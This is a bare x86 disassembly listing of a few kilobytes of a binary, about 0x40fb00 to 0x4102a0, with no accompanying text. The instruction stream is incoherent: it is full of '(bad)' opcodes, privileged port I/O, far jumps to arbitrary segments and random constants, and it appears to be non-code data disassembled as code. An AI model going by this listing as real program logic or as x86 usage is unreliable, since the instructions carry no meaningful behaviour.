  40fb00:	arpl   WORD PTR [edx],dx
  40fb02:	sub    esp,DWORD PTR [edi+0x6a81c736]
  40fb08:	cmp    al,0x5e
  40fb0a:	mov    dh,0x3c
  40fb0c:	pop    edi
  40fb0d:	aas    
  40fb0e:	leave  
  40fb0f:	lahf   
  40fb10:	sbb    BYTE PTR [ebp-0xf],dh
  40fb13:	mov    ebx,0x6645a0c
  40fb18:	(bad)
  40fb1c:	div    BYTE PTR [edx]
  40fb1e:	out    0x57,eax
  40fb20:	xor    al,cl
  40fb22:	data16 ds jns 0x40fb94
  40fb26:	fs cmp ch,0x9a
  40fb2a:	jne    0x40fb83
  40fb2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb2d:	pop    eax
  40fb2e:	repnz lds esp,FWORD PTR [esi]
  40fb31:	shr    BYTE PTR [ebp-0x36],0x4d
  40fb35:	dec    esp
  40fb36:	jecxz  0x40fb10
  40fb38:	mov    ebx,0xefca89fc
  40fb3d:	neg    DWORD PTR [ecx+0x136ae8ad]
  40fb43:	lods   al,BYTE PTR ds:[esi]
  40fb44:	retf   
  40fb45:	mov    ss,WORD PTR [esi]
  40fb47:	cmc    
  40fb48:	push   esp
  40fb4a:	jno    0x40faf3
  40fb4c:	jmp    0x56a49e17
  40fb51:	mov    ah,0x9b
  40fb53:	(bad)  
  40fb54:	aas    
  40fb55:	mov    bl,0xc5
  40fb57:	retf   0xff2f
  40fb5a:	hlt    
  40fb5b:	fiadd  DWORD PTR [eax+0x5b]
  40fb5e:	iret   
  40fb5f:	loop   0x40fb98
  40fb61:	jb     0x40fb99
  40fb63:	xchg   edi,eax
  40fb64:	mov    ds:0x30cc49a,eax
  40fb69:	ins    DWORD PTR es:[edi],dx
  40fb6a:	cmp    ebx,DWORD PTR [esp+ecx*1]
  40fb6d:	dec    edi
  40fb6e:	dec    ebx
  40fb6f:	mov    cl,0xca
  40fb71:	jmp    0x6687b7fa
  40fb76:	inc    ebx
  40fb77:	jmp    0x57032193
  40fb7c:	(bad)  
  40fb7d:	sti    
  40fb7e:	nop
  40fb7f:	mov    dh,0x46
  40fb81:	in     al,dx
  40fb82:	inc    edi
  40fb83:	xchg   ebx,eax
  40fb84:	jae    0x40fb82
  40fb86:	jle    0x40fb47
  40fb88:	cmp    edi,DWORD PTR [ebx]
  40fb8a:	aam    0x62
  40fb8c:	cmp    ah,BYTE PTR [eax+0x64]
  40fb8f:	pop    eax
  40fb90:	push   es
  40fb91:	test   ebp,edx
  40fb93:	dec    eax
  40fb94:	stos   BYTE PTR es:[edi],al
  40fb95:	in     al,0x72
  40fb97:	dec    edi
  40fb98:	mov    esi,0x6906d106
  40fb9d:	pop    ecx
  40fb9e:	xchg   ebx,eax
  40fb9f:	nop
  40fba0:	out    0x8c,al
  40fba2:	xchg   ecx,eax
  40fba3:	jp     0x40fbd1
  40fba5:	xchg   ebp,eax
  40fba6:	mov    ecx,0x9b7c4324
  40fbab:	jno    0x40fc06
  40fbad:	pop    es
  40fbae:	fdivr  st(7),st
  40fbb0:	push   esi
  40fbb1:	fs cmc 
  40fbb3:	std    
  40fbb4:	dec    edi
  40fbb5:	out    0x14,al
  40fbb7:	or     DWORD PTR [ebx+0x5ac9a550],esp
  40fbbd:	dec    esi
  40fbbe:	push   es
  40fbbf:	das    
  40fbc0:	mov    bh,0xe0
  40fbc2:	out    0x66,al
  40fbc4:	lods   al,BYTE PTR ds:[esi]
  40fbc5:	fstp   QWORD PTR [ebx]
  40fbc7:	jp     0x40fbc9
  40fbc9:	push   esp
  40fbca:	jmp    0x40fba4
  40fbcc:	inc    esp
  40fbcd:	cwde   
  40fbce:	dec    esi
  40fbcf:	sub    eax,0x1ecd8de8
  40fbd4:	xor    bl,BYTE PTR [edi+0x4f]
  40fbd7:	adc    DWORD PTR [ebx+0x5f],0xc7fe1869
  40fbde:	adc    cl,bh
  40fbe0:	icebp  
  40fbe1:	sub    DWORD PTR [ebx-0x3ea1c67d],0xffffffdb
  40fbe8:	hlt    
  40fbe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbea:	adc    BYTE PTR [edx-0x584c8fdd],al
  40fbf0:	fisubr WORD PTR [ebx-0x50fab9b6]
  40fbf6:	adc    DWORD PTR [edi-0x24],ecx
  40fbf9:	mov    eax,0xa1bc6288
  40fbfe:	cmp    bl,BYTE PTR [ebx+0x4c]
  40fc01:	sub    ebp,edi
  40fc03:	dec    edi
  40fc04:	repz stc 
  40fc06:	push   ebx
  40fc07:	fiadd  DWORD PTR [edx]
  40fc09:	cmp    al,0x1d
  40fc0b:	call   0xf9ae:0x41cc5d4a
  40fc12:	pop    edx
  40fc13:	mov    edi,0xa3f701b3
  40fc18:	(bad)  
  40fc19:	or     eax,DWORD PTR cs:[edi]
  40fc1c:	sbb    BYTE PTR [esp+edi*2],cl
  40fc1f:	push   ebp
  40fc20:	into   
  40fc21:	in     al,dx
  40fc22:	pop    es
  40fc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc24:	pop    es
  40fc25:	jbe    0x40fc1d
  40fc27:	in     al,0xd
  40fc29:	stc    
  40fc2a:	sbb    DWORD PTR [edx],ebx
  40fc2c:	cmp    BYTE PTR [edx],ah
  40fc2e:	stos   BYTE PTR es:[edi],al
  40fc2f:	pop    es
  40fc30:	cdq    
  40fc31:	pop    ebp
  40fc32:	mov    edi,0x66c083f7
  40fc37:	pop    edi
  40fc38:	inc    esp
  40fc39:	pop    edx
  40fc3a:	ror    DWORD PTR [edx-0x6d],1
  40fc3d:	mov    esi,0xc3b6b9dd
  40fc42:	xchg   ebx,eax
  40fc43:	data16 cli 
  40fc45:	sub    al,BYTE PTR [ebx+0x252c7fcb]
  40fc4b:	sub    ebx,DWORD PTR [esi-0x1cba77]
  40fc51:	adc    esi,DWORD PTR [esi-0x62]
  40fc54:	lahf   
  40fc55:	cmp    eax,0x3774a2d
  40fc5a:	pop    ecx
  40fc5b:	or     eax,0x70bdba2f
  40fc60:	shl    BYTE PTR [edx+0x2c1034ea],cl
  40fc66:	fs add eax,edx
  40fc69:	aas    
  40fc6a:	mov    ebx,0xc2f3db23
  40fc6f:	repz or edx,edx
  40fc72:	fscale 
  40fc74:	inc    ecx
  40fc75:	add    BYTE PTR [esi+edi*8+0x54393fae],0xc3
  40fc7d:	movzx  esp,WORD PTR [ebp-0x3f]
  40fc81:	and    dl,bh
  40fc83:	aam    0x74
  40fc85:	xchg   BYTE PTR [eax+esi*2+0x2b],ch
  40fc89:	add    al,0x46
  40fc8b:	xor    eax,0xfff23625
  40fc90:	cmc    
  40fc91:	cmp    esp,DWORD PTR [edi+0x8]
  40fc94:	popf   
  40fc95:	scas   eax,DWORD PTR es:[edi]
  40fc96:	test   BYTE PTR [edx],0x7
  40fc99:	ret    0x126
  40fc9c:	test   al,0x48
  40fc9e:	scas   eax,DWORD PTR es:[edi]
  40fc9f:	xchg   esp,eax
  40fca0:	mov    ?,WORD PTR [ebp+0x56]
  40fca3:	das    
  40fca4:	mov    edi,0x764b22d6
  40fca9:	or     eax,0xe6c9bf41
  40fcae:	mov    eax,0x4bd2d015
  40fcb3:	pop    ebp
  40fcb4:	add    dh,BYTE PTR [edi+0x222ff99b]
  40fcba:	cwde   
  40fcbb:	hlt    
  40fcbc:	push   edi
  40fcbd:	push   0xe99014dd
  40fcc2:	sub    DWORD PTR [eax+0x7e],edx
  40fcc5:	(bad)  
  40fcc6:	(bad)  
  40fcc8:	push   ecx
  40fcc9:	sub    dl,ch
  40fccb:	and    DWORD PTR [ebx+0x68],ebx
  40fcce:	ret    0x6538
  40fcd1:	fist   DWORD PTR [edx+0x280de57e]
  40fcd7:	add    bl,BYTE PTR [ebp+0xb0e1c6d]
  40fcdd:	cmp    DWORD PTR [edi],esp
  40fcdf:	inc    esi
  40fce0:	loop   0x40fd36
  40fce2:	lahf   
  40fce3:	popa   
  40fce4:	mov    dh,0xe1
  40fce6:	shl    DWORD PTR [ecx-0xaa45455],cl
  40fcec:	dec    ebx
  40fced:	in     eax,0x63
  40fcef:	push   esp
  40fcf0:	push   eax
  40fcf1:	in     eax,dx
  40fcf2:	outs   dx,BYTE PTR ds:[esi]
  40fcf3:	push   ebp
  40fcf4:	faddp  st(6),st
  40fcf6:	out    0xc1,eax
  40fcf8:	stos   BYTE PTR es:[edi],al
  40fcf9:	adc    BYTE PTR [ecx-0x2f071608],0x24
  40fd00:	xchg   ebp,eax
  40fd01:	dec    edi
  40fd02:	in     eax,0x15
  40fd04:	jo     0x40fcbe
  40fd06:	jle    0x40fd3e
  40fd08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd09:	pop    ebx
  40fd0a:	call   0x6704:0x4146cb1a
  40fd11:	push   esp
  40fd12:	jmp    0xb191:0x646a0065
  40fd19:	jnp    0x40fd99
  40fd1b:	jb     0x40fd02
  40fd1d:	lods   eax,DWORD PTR ds:[esi]
  40fd1e:	js     0x40fca4
  40fd20:	push   edi
  40fd21:	(bad)  
  40fd23:	ret    0xde02
  40fd26:	bound  esi,QWORD PTR [esi+esi*8+0xd22c691]
  40fd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd2e:	adc    cl,BYTE PTR [edx-0x4b]
  40fd31:	repz sbb DWORD PTR [esp+edi*4],edi
  40fd35:	imul   ecx,DWORD PTR [ebx],0x6b
  40fd38:	push   esi
  40fd39:	push   0xffffffdc
  40fd3b:	int    0x8f
  40fd3d:	dec    edx
  40fd3e:	jo     0x40fd9d
  40fd40:	rcl    bl,1
  40fd42:	mov    ebp,0x133af955
  40fd47:	(bad)  
  40fd48:	jmp    0x8538:0xf6593eac
  40fd4f:	and    esp,DWORD PTR [ebp-0x25c54a46]
  40fd55:	sar    esp,cl
  40fd57:	mov    ecx,gs
  40fd59:	enter  0x9ee3,0x6
  40fd5d:	aad    0xfd
  40fd5f:	es js  0x40fd79
  40fd62:	addr16 mov ebp,cs
  40fd65:	inc    esi
  40fd66:	iret   
  40fd67:	jl     0x40fcf4
  40fd69:	add    edi,DWORD PTR [ebp+ecx*4+0x33]
  40fd6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd6e:	adc    BYTE PTR [ecx+0x2d35b41f],al
  40fd74:	mov    ds:0x46a2998,eax
  40fd79:	aad    0xc1
  40fd7b:	mov    eax,ds:0xc82ffc12
  40fd80:	jns    0x40fd72
  40fd82:	fcmovnu st,st(1)
  40fd84:	in     al,0xed
  40fd86:	dec    edx
  40fd87:	cld    
  40fd88:	rcl    ebx,0xde
  40fd8b:	call   0x3529102f
  40fd90:	outs   dx,DWORD PTR ds:[esi]
  40fd91:	mov    edx,0x8cbdafc3
  40fd96:	repz or dh,BYTE PTR [edx+0x125db2dd]
  40fd9d:	xchg   DWORD PTR [ecx+0x36],ebp
  40fda0:	pusha  
  40fda1:	in     al,0x7b
  40fda3:	jle    0x40fe1f
  40fda5:	xchg   esi,eax
  40fda6:	mov    dl,0x54
  40fda8:	popf   
  40fda9:	cs mov cl,0x79
  40fdac:	(bad)  
  40fdad:	xlat   BYTE PTR ds:[ebx]
  40fdae:	jb     0x40fd31
  40fdb0:	or     DWORD PTR [edi],edi
  40fdb2:	out    0x48,eax
  40fdb4:	mov    cl,0x5b
  40fdb6:	mov    eax,0x2987de37
  40fdbb:	mov    esp,gs
  40fdbd:	and    cl,0xa3
  40fdc0:	lahf   
  40fdc1:	lahf   
  40fdc2:	aaa    
  40fdc3:	xor    BYTE PTR [ecx-0x2a],cl
  40fdc6:	in     eax,0xbf
  40fdc8:	mov    eax,ds:0x390661d8
  40fdcd:	rcr    ebp,0xfc
  40fdd0:	mov    ah,0xb9
  40fdd2:	xor    dl,0xd7
  40fdd5:	or     al,0xdc
  40fdd7:	inc    esi
  40fdd8:	jmp    0xfbc5:0xee788edc
  40fddf:	sar    DWORD PTR [ebx],cl
  40fde1:	adc    DWORD PTR [edx-0x18],ecx
  40fde4:	test   bh,ah
  40fde6:	mov    DWORD PTR [edx+0x44],ebp
  40fde9:	or     cl,bh
  40fdeb:	aas    
  40fdec:	mov    ah,0xa0
  40fdee:	cmp    eax,0x7db5d7bb
  40fdf3:	mov    bh,0xb2
  40fdf5:	push   cs
  40fdf6:	stos   BYTE PTR es:[edi],al
  40fdf7:	and    ecx,DWORD PTR [eax+esi*2-0x4f]
  40fdfb:	aas    
  40fdfc:	cmp    DWORD PTR [ebp-0x7fa944f5],esp
  40fe02:	jge    0x40fe36
  40fe04:	or     ebp,DWORD PTR [esi+0x16]
  40fe07:	or     bl,BYTE PTR [edi+0xe]
  40fe0a:	clc    
  40fe0b:	dec    ecx
  40fe0c:	and    al,0xc7
  40fe0e:	ror    BYTE PTR [edi],cl
  40fe10:	and    BYTE PTR [edx],bh
  40fe12:	mov    ds:0x54be26ec,eax
  40fe17:	pop    esp
  40fe18:	and    edx,eax
  40fe1a:	pop    es
  40fe1b:	adc    al,0x66
  40fe1d:	xor    edx,DWORD PTR [eax+0x2d]
  40fe20:	daa    
  40fe21:	pop    esp
  40fe22:	xchg   esi,eax
  40fe23:	push   ebx
  40fe24:	xlat   BYTE PTR ds:[ebx]
  40fe25:	nop
  40fe26:	int3   
  40fe27:	dec    esp
  40fe28:	xchg   ebp,eax
  40fe29:	repz or eax,0x91b8deef
  40fe2f:	xchg   esi,eax
  40fe30:	js     0x40fe44
  40fe32:	ja     0x40fdda
  40fe34:	or     eax,DWORD PTR [esi]
  40fe36:	pop    eax
  40fe37:	adc    eax,DWORD PTR [ebx]
  40fe39:	retf   
  40fe3a:	xchg   edi,eax
  40fe3b:	test   DWORD PTR [esi],ecx
  40fe3d:	jae    0x40fe5c
  40fe3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe40:	fld    DWORD PTR [edx+edi*1-0x65f5fbb3]
  40fe47:	dec    esi
  40fe48:	shr    DWORD PTR ds:0x88648de0,cl
  40fe4e:	dec    edi
  40fe4f:	add    dl,BYTE PTR [ecx+edx*8-0x52]
  40fe53:	mov    esp,0x3fc540ec
  40fe58:	add    eax,0x95e0d643
  40fe5d:	inc    esi
  40fe5e:	enter  0xb4f7,0x4
  40fe62:	out    0x1,eax
  40fe64:	mov    ebp,0xbd7a1cca
  40fe69:	addr16 aam 0x48
  40fe6c:	pop    es
  40fe6d:	add    al,0xa7
  40fe6f:	mov    ebp,0x565a4743
  40fe74:	test   al,0xb4
  40fe76:	test   dl,ch
  40fe78:	dec    edx
  40fe79:	and    DWORD PTR [ebx+0x2a303d63],esp
  40fe7f:	inc    ebp
  40fe80:	sbb    eax,0xf1d002ff
  40fe85:	dec    eax
  40fe86:	dec    eax
  40fe87:	or     eax,DWORD PTR [edx+0x28f58c02]
  40fe8d:	jg     0x40fed2
  40fe8f:	mov    ecx,0xdc4ae966
  40fe94:	push   ds
  40fe95:	pop    ds
  40fe96:	(bad)  
  40fe97:	fist   WORD PTR [edx-0x3f]
  40fe9a:	test   al,0x39
  40fe9c:	(bad)  
  40fe9d:	call   0xd1d0fa93
  40fea2:	pop    esi
  40fea3:	xchg   ebx,eax
  40fea4:	out    dx,al
  40fea5:	xchg   ebp,eax
  40fea6:	cmp    bh,BYTE PTR [ebp+0x2f00d51]
  40feac:	out    dx,eax
  40fead:	xor    bh,BYTE PTR [ebx-0x3478c0a7]
  40feb3:	imul   ecx,ebp,0xa6e08873
  40feb9:	sub    DWORD PTR [ecx+0x68],ebx
  40febc:	adc    cl,cl
  40febe:	shr    DWORD PTR [edi],0xf2
  40fec1:	push   0xffffffd5
  40fec3:	mov    al,0x62
  40fec5:	push   esp
  40fec6:	push   cs
  40fec7:	lods   al,BYTE PTR ds:[esi]
  40fec8:	xor    ch,BYTE PTR [ebx+ecx*4]
  40fecb:	jp     0x40feb1
  40fecd:	nop
  40fece:	mov    esp,0x99b9a79a
  40fed3:	cdq    
  40fed4:	jae    0x40fe99
  40fed6:	pop    esp
  40fed7:	arpl   WORD PTR [eax-0x6efca468],di
  40fedd:	pop    ecx
  40fede:	push   ebx
  40fedf:	xor    ah,0xbe
  40fee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fee3:	rcr    DWORD PTR [edx-0x116a48a1],1
  40fee9:	mov    eax,ds:0xe43cb5b9
  40feee:	push   0x3e6449ba
  40fef3:	aam    0xbf
  40fef5:	mov    al,0xec
  40fef7:	xor    al,0x2c
  40fef9:	sbb    eax,0xdaa92454
  40fefe:	cwde   
  40feff:	sbb    DWORD PTR [esi],ebx
  40ff01:	int3   
  40ff02:	mov    gs,esp
  40ff04:	js     0x40ff85
  40ff06:	xor    bh,BYTE PTR [edi]
  40ff08:	push   esp
  40ff09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff0a:	or     esp,DWORD PTR [ecx-0x68]
  40ff0d:	inc    ecx
  40ff0e:	sahf   
  40ff0f:	dec    ebx
  40ff10:	sub    BYTE PTR [eax+0x3b6d441e],al
  40ff16:	mov    al,BYTE PTR [edx+0x4c]
  40ff19:	jle    0x40ff39
  40ff1b:	cs pop edi
  40ff1d:	dec    esi
  40ff1e:	xlat   BYTE PTR ds:[ebx]
  40ff1f:	cs jbe 0x40ff44
  40ff22:	push   ebp
  40ff23:	mov    ah,BYTE PTR [ecx]
  40ff25:	cdq    
  40ff26:	mov    bh,0x8c
  40ff28:	stc    
  40ff29:	adc    ah,al
  40ff2b:	or     ebp,DWORD PTR [esi-0x3a83c3c]
  40ff31:	mov    ecx,0x26351978
  40ff36:	repz adc eax,0x31746705
  40ff3c:	or     DWORD PTR [eax],esi
  40ff3e:	xor    dl,BYTE PTR [ebx]
  40ff40:	push   ebp
  40ff41:	xchg   edi,eax
  40ff42:	add    al,0x3b
  40ff44:	gs test eax,0x65f02cae
  40ff4a:	adc    eax,0x202fd788
  40ff4f:	idiv   BYTE PTR [edi+0x2e]
  40ff52:	pusha  
  40ff53:	sahf   
  40ff54:	mov    edx,0xdac13d2b
  40ff59:	mov    WORD PTR [ecx-0x33],gs
  40ff5c:	mov    eax,0xb24ed991
  40ff61:	cs add eax,0x355f6856
  40ff67:	inc    edi
  40ff68:	enter  0xb213,0xf4
  40ff6c:	call   0x73ce08a3
  40ff71:	cmp    al,0x81
  40ff73:	or     edx,DWORD PTR [ebp-0x5290b444]
  40ff79:	loope  0x40ff5e
  40ff7b:	ss xchg esp,eax
  40ff7d:	test   BYTE PTR [ecx-0x4997bd32],0x2f
  40ff84:	cmp    al,0xb0
  40ff86:	xlat   BYTE PTR ds:[ebx]
  40ff87:	xchg   edx,eax
  40ff88:	aad    0x85
  40ff8a:	(bad)  
  40ff8b:	jle    0x40ffae
  40ff8d:	jnp    0x40ff60
  40ff8f:	(bad)  
  40ff90:	leave  
  40ff91:	iret   
  40ff92:	repnz das 
  40ff94:	fsub   DWORD PTR [edx+edi*8+0x44]
  40ff98:	scas   eax,DWORD PTR es:[edi]
  40ff99:	aad    0x99
  40ff9b:	arpl   WORD PTR [esi-0x27],cx
  40ff9e:	fldenv [eax+0x547cd8a1]
  40ffa4:	jmp    0x3bff:0x6f9680e6
  40ffab:	stos   BYTE PTR es:[edi],al
  40ffac:	inc    esp
  40ffad:	jl     0x40ffdf
  40ffaf:	out    0x36,al
  40ffb1:	or     esp,DWORD PTR [ebp-0x55fe5f72]
  40ffb7:	xor    DWORD PTR [ecx+0x7e49d28e],0xfffffffc
  40ffbe:	jae    0x41002a
  40ffc0:	cmc    
  40ffc1:	pop    ds
  40ffc2:	rcr    DWORD PTR [eax+0x5078f42b],1
  40ffc8:	mov    ds:0x678efa85,eax
  40ffcd:	jmp    0xdc9a:0x8c191b99
  40ffd4:	retf   0x68de
  40ffd7:	das    
  40ffd8:	push   0x4c
  40ffda:	mov    cl,0x64
  40ffdc:	and    cl,BYTE PTR [edx+0x7]
  40ffdf:	iret   
  40ffe0:	sahf   
  40ffe1:	mov    edi,0x8de6a759
  40ffe6:	(bad)  
  40ffe7:	ror    BYTE PTR [edx],0x33
  40ffea:	pop    edx
  40ffeb:	(bad)  
  40ffed:	mov    cl,0x90
  40ffef:	ficomp DWORD PTR [edi]
  40fff1:	pop    ss
  40fff2:	neg    DWORD PTR [edx+0x46]
  40fff5:	push   eax
  40fff6:	mov    dl,0x34
  40fff8:	mov    eax,ds:0x828cc7ed
  40fffd:	bound  ebx,QWORD PTR [esi+0x52cf5769]
  410003:	ret    
  410004:	lock and eax,0x8958b3a0
  41000a:	arpl   WORD PTR [esi+0x5e],dx
  41000d:	push   esi
  41000e:	push   0xb1b6e901
  410013:	outs   dx,DWORD PTR ds:[esi]
  410014:	jg     0x41006f
  410016:	cs or  al,0xdd
  410019:	sub    esp,DWORD PTR fs:[eax+0x2df5780a]
  410020:	mov    ds:0xaff56d20,eax
  410025:	xor    cl,BYTE PTR [ebx+ebx*1]
  410028:	push   ebp
  410029:	jge    0x40ffc6
  41002b:	xlat   BYTE PTR ds:[ebx]
  41002c:	mov    ebx,0x5d55b49d
  410031:	sub    BYTE PTR [edx],ah
  410033:	adc    BYTE PTR [ecx-0x7e],bh
  410036:	out    0xb4,eax
  410038:	mov    ds:0x3a17288e,eax
  41003d:	arpl   WORD PTR [eax+0x2f],di
  410040:	and    bh,al
  410042:	fld1   
  410044:	aam    0x8e
  410046:	mov    ds:0xbe4a364b,eax
  41004b:	out    dx,al
  41004c:	cmp    al,0x32
  41004e:	sub    BYTE PTR [ecx],ah
  410050:	pushf  
  410051:	ret    
  410052:	push   ss
  410053:	(bad)  
  410055:	xchg   edx,eax
  410056:	out    0x6b,eax
  410058:	dec    ebp
  410059:	stc    
  41005a:	mov    bl,0xa3
  41005c:	aas    
  41005d:	outs   dx,DWORD PTR ds:[esi]
  41005e:	inc    eax
  41005f:	sub    al,bh
  410061:	xchg   ebx,eax
  410062:	loopne 0x41006f
  410064:	push   es
  410065:	mov    ebp,0x8e4b124
  41006a:	ds push edx
  41006c:	pop    ds
  41006d:	push   ebp
  41006e:	jecxz  0x40fff5
  410070:	add    edi,esi
  410072:	loop   0x41007c
  410074:	repnz adc BYTE PTR [eax+0x326f4b91],dl
  41007b:	scas   al,BYTE PTR es:[edi]
  41007c:	mov    eax,0xdb93013
  410081:	xchg   edi,eax
  410082:	or     BYTE PTR [esi-0x2619396d],ch
  410088:	jns    0x4100d3
  41008a:	lods   eax,DWORD PTR cs:[esi]
  41008c:	hlt    
  41008d:	sub    bl,ah
  41008f:	repnz sub eax,0xae803681
  410095:	add    al,0x6c
  410097:	xor    al,0x2e
  410099:	adc    BYTE PTR [edx-0x2bf7a5a3],0x37
  4100a0:	xchg   ebx,eax
  4100a1:	mov    ds:0x9cbec47,eax
  4100a6:	stos   DWORD PTR es:[edi],eax
  4100a7:	pop    DWORD PTR [ecx-0x6c8cc96e]
  4100ad:	fwait
  4100ae:	call   0x60e9a116
  4100b3:	popf   
  4100b4:	scas   eax,DWORD PTR es:[edi]
  4100b5:	push   cs
  4100b6:	mov    edx,0xb6373e46
  4100bb:	mov    ch,cl
  4100bd:	cli    
  4100be:	popf   
  4100bf:	push   eax
  4100c0:	jl     0x4100cc
  4100c2:	xchg   esp,eax
  4100c3:	dec    eax
  4100c4:	adc    dh,dl
  4100c6:	dec    edx
  4100c7:	cld    
  4100c8:	aam    0xc4
  4100ca:	push   cs
  4100cb:	sub    al,0x28
  4100cd:	push   esi
  4100ce:	imul   ecx,ebp,0x409f9817
  4100d4:	imul   edx,DWORD PTR [esi-0x9],0xe71464bc
  4100db:	addr16 pusha 
  4100dd:	(bad)  [ebx*2-0x79009cf4]
  4100e4:	adc    al,BYTE PTR [edx-0x3aded08]
  4100ea:	hlt    
  4100eb:	ins    BYTE PTR es:[edi],dx
  4100ec:	and    BYTE PTR [esi],bh
  4100ee:	mov    fs,ebx
  4100f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f1:	call   0x624:0x3bc56398
  4100f8:	and    eax,0x706196e9
  4100fd:	jo     0x410108
  4100ff:	les    ebp,FWORD PTR [eax+eiz*2+0x20]
  410103:	leave  
  410104:	mov    BYTE PTR [eax+eiz*4+0x68],bl
  410108:	ds dec ebx
  41010a:	push   eax
  41010b:	mov    ebx,esi
  41010d:	or     DWORD PTR [ebx-0x76],eax
  410110:	fs ret 0x3662
  410114:	sub    eax,0xa3bbe47f
  410119:	xchg   esp,eax
  41011a:	test   edx,ebx
  41011c:	ret    0x8481
  41011f:	jnp    0x4100c0
  410121:	call   0x9b7c:0x69fec52d
  410128:	cs xchg esp,esp
  41012b:	sub    DWORD PTR [eax-0x3a341d66],0xa801dc2f
  410135:	push   es
  410136:	es jmp 0x41017e
  410139:	call   0x9cf0:0xa46463d6
  410140:	sbb    al,BYTE PTR [esi-0x505c79a6]
  410146:	xor    bl,BYTE PTR [edx]
  410148:	(bad)  
  410149:	jmp    0x77b0:0xa37b0e9
  410150:	outs   dx,DWORD PTR ds:[esi]
  410151:	push   es
  410152:	and    ebx,ebp
  410154:	jo     0x410124
  410156:	push   ecx
  410157:	dec    esp
  410158:	dec    esp
  410159:	dec    edx
  41015a:	loope  0x410151
  41015c:	cmp    BYTE PTR [esi+edx*1+0x43958011],0x47
  410164:	mov    ds:0xb1561b70,al
  410169:	mov    bh,BYTE PTR [esi+0x183cd2dd]
  41016f:	(bad)  
  410170:	mov    eax,ds:0xae66f18b
  410175:	(bad)  
  410176:	call   0x1d28badc
  41017b:	xchg   DWORD PTR [edi+0x188545a3],edi
  410181:	scas   al,BYTE PTR es:[edi]
  410182:	test   esi,esi
  410184:	jo     0x4101ec
  410186:	int    0x91
  410188:	add    bl,BYTE PTR [ecx+0x17]
  41018b:	dec    edi
  41018c:	call   0x16f4:0x93987e9b
  410193:	loope  0x410130
  410195:	mov    edx,0x6564bb6a
  41019a:	stos   BYTE PTR es:[edi],al
  41019b:	jle    0x41018c
  41019d:	shl    ebx,0xa5
  4101a0:	jp     0x4101a2
  4101a2:	add    ebp,DWORD PTR [eax+0x362634a1]
  4101a8:	cdq    
  4101a9:	inc    ecx
  4101aa:	fsubr  DWORD PTR [edi]
  4101ac:	fld    st(6)
  4101ae:	pushf  
  4101af:	push   cs
  4101b0:	repnz dec eax
  4101b2:	test   eax,0x8a1e2d33
  4101b7:	mov    al,0xea
  4101b9:	out    dx,al
  4101ba:	ret    0xd057
  4101bd:	sar    DWORD PTR [ebp-0x34],0xbb
  4101c1:	scas   eax,DWORD PTR es:[edi]
  4101c2:	inc    ebx
  4101c3:	in     eax,0x86
  4101c5:	aaa    
  4101c6:	xchg   edx,eax
  4101c7:	add    BYTE PTR [edi+0xf2edbbd],ah
  4101cd:	fs cld 
  4101cf:	les    ebp,FWORD PTR [ecx]
  4101d1:	push   ss
  4101d2:	jecxz  0x410186
  4101d4:	add    DWORD PTR [eax],0x51
  4101d7:	call   0x8f90:0x3c8d7c47
  4101de:	in     eax,0xe6
  4101e0:	sub    bl,BYTE PTR ds:0x98919d45
  4101e6:	out    0x28,eax
  4101e8:	jb     0x4101c9
  4101ea:	mov    al,ds:0xe6326e49
  4101ef:	jbe    0x4101b7
  4101f1:	pusha  
  4101f2:	popa   
  4101f3:	sahf   
  4101f4:	sbb    esi,DWORD PTR [eax-0x13]
  4101f7:	lods   al,BYTE PTR ds:[esi]
  4101f8:	xchg   ebp,eax
  4101f9:	pushf  
  4101fa:	inc    ecx
  4101fb:	push   eax
  4101fc:	(bad)  
  4101fd:	xlat   BYTE PTR ds:[ebx]
  4101fe:	arpl   WORD PTR [ebx+edi*2],di
  410201:	pop    esp
  410202:	test   eax,0x1da5b6ec
  410207:	fbstp  TBYTE PTR [edi-0x6b]
  41020a:	jmp    0xc625:0x9c5a5ea9
  410211:	dec    ebx
  410212:	mov    al,ds:0x2e209a1b
  410217:	jle    0x4101ba
  410219:	dec    ecx
  41021a:	sbb    al,0x84
  41021c:	mov    bl,0xcd
  41021e:	xor    DWORD PTR [edx],ebx
  410220:	pop    ebp
  410221:	jbe    0x410225
  410223:	adc    al,0xa7
  410225:	mov    al,ds:0xbfad0e23
  41022a:	sub    DWORD PTR fs:[edx+ecx*2],edx
  41022e:	loop   0x4101c0
  410230:	cld    
  410231:	mov    esp,0x2add08e5
  410236:	inc    ecx
  410237:	jmp    0xc914:0x14548f31
  41023e:	lahf   
  41023f:	and    DWORD PTR [esi],edi
  410241:	cli    
  410242:	jnp    0x410248
  410244:	mov    esi,0x4f9d9c68
  410249:	push   ecx
  41024a:	stos   BYTE PTR es:[edi],al
  41024b:	dec    edi
  41024c:	js     0x4101ea
  41024e:	cmc    
  41024f:	sahf   
  410250:	repnz test BYTE PTR [edx+0x6546c00b],ah
  410257:	sub    esp,ebp
  410259:	jle    0x41023a
  41025b:	pop    ebx
  41025c:	cmp    al,0xa
  41025e:	add    dh,BYTE PTR [edx+0x5b]
  410261:	(bad)  
  410262:	out    0x5,al
  410264:	repz fs cmp ebx,0x30bf2e22
  41026c:	xchg   esi,eax
  41026d:	ret    0xcdea
  410270:	jno    0x41021a
  410272:	jne    0x410202
  410274:	push   esi
  410275:	mov    dh,0x37
  410277:	add    ebx,ebp
  410279:	push   cs
  41027a:	pushf  
  41027b:	sub    esi,DWORD PTR [ebx+0x5118c9d2]
  410281:	enter  0xe1fe,0xc9
  410285:	stos   BYTE PTR es:[edi],al
  410286:	jbe    0x410210
  410288:	and    edi,DWORD PTR [edi+ebx*2-0xa50b0f1]
  41028f:	aas    
  410290:	sahf   
  410291:	aad    0x8b
  410293:	fwait
  410294:	add    al,BYTE PTR [ebp+ebx*1+0x75]
  410298:	and    al,0x88
  41029a:	aaa    
  41029b:	les    esi,FWORD PTR [ebx-0x53]
  41029e:	push   0x79
  4102a0:	fist   WORD PTR [ebx]
